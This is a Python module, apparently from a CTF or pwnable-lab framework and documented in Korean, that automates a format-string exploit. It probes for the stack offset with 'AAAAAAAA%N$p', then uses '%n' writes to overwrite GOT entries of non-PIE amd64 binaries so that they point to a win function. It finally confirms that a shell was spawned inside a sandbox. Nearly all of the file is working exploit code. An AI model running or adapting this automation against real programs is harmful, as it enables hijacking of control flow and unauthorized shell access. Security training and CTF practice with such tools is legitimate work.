"""완전 자동 포맷스트링 GOT 덮어쓰기 (``%n`` 임의 쓰기 → GOT → win → 셸).

``printf(user_input)`` 처럼 포맷 문자열을 제어할 수 있는 취약점을 위한 경로다.
지금까지 포맷스트링은 **읽기**(:mod:`sandbox.fmtleak` 의 ``%p`` in-band leak)만
자동화돼 있었고, **쓰기**(``%n``)로 GOT 를 덮어 제어를 탈취하는 고전 기법은 정적
전략 카드의 조언 텍스트뿐 자동 경로가 없었다. 이 모듈이 그것을 자동화한다.

흐름:

1. **fmt 위치 확정**: ``AAAAAAAA%N$p`` 를 위치별로 주입해 우리 입력 버퍼의 첫 qword
   가 놓이는 스택 인자 인덱스(``0x4141414141414141`` 이 반사되는 N)를 동적 확정한다.
2. **GOT 후보 수집**: 동적 링크된 임포트 함수들의 ``.got.plt`` 슬롯
   (:func:`analyzer.strategy.got_overwrite_targets`)을 모두 후보로 둔다. 어느 함수가
   포맷스트링 뒤에 호출되는지는 정적으로 확정하기 어려우므로 후보를 모두 시도한다.
3. **셸 증명**: 각 후보에 대해 ``fmtstr(pos, {got: win})`` payload 로 GOT 를 덮고,
   PTY 로 셸을 몰아 ``echo <marker>`` 로 셸 획득을 직접 증명한다. 포맷 함수 자신을
   루프에서 덮는 경우를 위해 트리거 입력을 한 번 더 보내는 변형도 시도한다.

대상은 **non-PIE amd64** 다 — GOT 주소와 ``win`` 주소가 모두 절대주소라 base leak
없이 곧바로 성립한다(PIE 는 별도 base leak 이 선행돼야 하며 현재 범위 밖). ret2system
코어와 마찬가지로 **실행이 일어나는 프로세스**(in-process 또는 컨테이너 안 CLI)에서
호출된다.
"""

from __future__ import annotations

import secrets
from pathlib import Path

from pwnable_lab.analyzer.strategy import (
    got_overwrite_targets,
    is_pie,
    ret2win_target,
)
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.payload.pack import build_fmtstr_write
from pwnable_lab.sandbox.runner import SandboxLimits, run_with_input, verify_shell

# probe 할 포맷스트링 인자 위치(첫 몇 개는 레지스터/프레임 잡값이라 6부터).
_PROBE_START = 6
_PROBE_END = 40

# probe 마커: 8바이트 'A' → 반사되면 0x4141414141414141.
_PROBE_MARKER = b"AAAAAAAA"
_PROBE_HEX = b"0x4141414141414141"


def auto_fmt_got_overwrite(
    binary_path: str, *, limits: SandboxLimits | None = None
) -> dict:
    """non-PIE amd64 바이너리에서 포맷스트링 GOT 덮어쓰기로 셸을 자동 증명한다.

    fmt 위치를 자체 확정하므로 오프셋 인자가 필요 없다. GOT 후보를 모두 시도해
    셸이 뜨는 첫 (심볼, 트리거) 조합을 채택한다.
    """

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 64:
        return {"attempted": False, "reason": "amd64-only"}
    if is_pie(image):
        return {"attempted": False, "reason": "pie-needs-base-leak"}

    win = ret2win_target(image)
    if win is None:
        return {"attempted": False, "reason": "no-redirect-target"}
    targets = got_overwrite_targets(image)
    if not targets:
        return {"attempted": False, "reason": "no-got-target"}

    limits = limits or SandboxLimits()

    position = _find_fmt_position(binary_path, limits)
    if position is None:
        return {"attempted": False, "reason": "no-fmt-primitive"}

    win_name, win_addr = win
    last_proof: dict | None = None
    for symbol, got_addr in targets:
        payload = build_fmtstr_write(position, {got_addr: win_addr})
        # trigger=None: 포맷스트링 뒤에 호출되는 함수(예: puts/exit)를 덮는 경우.
        # trigger=b"...": 루프 안 포맷 함수 자신을 덮고 다음 입력으로 재호출하는 경우.
        for trigger in (None, _PROBE_MARKER):
            # 셸 획득 오라클은 셸이 **계산한** 값이어야 한다. 취약한 루프는
            # ``printf(buf)`` 로 입력을 그대로 출력하므로, ``echo <marker>`` 처럼
            # 명령 텍스트에 marker 가 들어 있으면 셸 실행 없이도 반사돼 거짓 양성이
            # 된다. 산술식을 셸이 평가한 곱만 출력에 나타나게 한다(입력 텍스트엔 없음).
            command, marker = _shell_arith_probe()
            proof = verify_shell(
                binary_path,
                payload,
                marker=marker,
                command=command,
                trigger=trigger,
                limits=limits,
            )
            last_proof = proof.as_dict()
            if proof.shell_spawned:
                return _report(
                    position,
                    symbol,
                    got_addr,
                    win_name,
                    win_addr,
                    trigger is not None,
                    True,
                    "shell-proven",
                    last_proof,
                )

    return _report(
        position,
        None,
        None,
        win_name,
        win_addr,
        False,
        False,
        "did-not-spawn-shell",
        last_proof,
    )


def _shell_arith_probe() -> tuple[str, str]:
    """셸이 평가해야만 나오는 산술 오라클 ``(command, marker)`` 를 만든다.

    ``echo $((a*b))`` 는 진짜 셸에서만 곱을 출력한다. 취약 루프가 입력을 그대로
    ``printf`` 로 되비추더라도 명령 텍스트엔 곱이 없으므로 거짓 양성을 배제한다.
    """

    a = secrets.randbelow(90000) + 10000
    b = secrets.randbelow(90000) + 10000
    return f"echo $(({a}*{b}))", str(a * b)


def _find_fmt_position(binary_path: str, limits: SandboxLimits) -> int | None:
    """``AAAAAAAA%N$p`` 를 위치별로 주입해 입력 버퍼 첫 qword 의 인자 인덱스를 찾는다.

    ``0x4141414141414141`` 이 반사되는 첫 위치 N 을 반환한다(없으면 포맷스트링
    취약점이 없거나 버퍼가 스택 인자로 안 보임 → None). 2회 관측이 일치할 때만 채택.
    """

    for position in range(_PROBE_START, _PROBE_END + 1):
        hits = 0
        for _ in range(2):
            probe = _PROBE_MARKER + b"%" + str(position).encode() + b"$p"
            obs = run_with_input(
                binary_path, probe + b"\n", capture_stdout=True, limits=limits
            )
            if _PROBE_HEX in obs.stdout.lower():
                hits += 1
        if hits == 2:
            return position
    return None


def _report(
    position: int,
    symbol: str | None,
    got_addr: int | None,
    win_name: str,
    win_addr: int,
    triggered: bool,
    succeeded: bool,
    reason: str,
    shell_proof: dict | None,
) -> dict:
    report: dict = {
        "attempted": True,
        "technique": "fmt-got-overwrite",
        "fmt_position": position,
        "target_name": win_name,
        "target_hex": f"0x{win_addr:x}",
        "got_symbol": symbol,
        "got_hex": None if got_addr is None else f"0x{got_addr:x}",
        # 포맷 함수 자신을 덮고 다음 입력으로 재호출했는지(루프형) 여부.
        "loop_trigger": triggered,
        "shell_proven": reason == "shell-proven",
        "succeeded": succeeded,
        "reason": reason,
    }
    if shell_proof is not None:
        report["shell_proof"] = shell_proof
    return report


__all__ = ["auto_fmt_got_overwrite"]
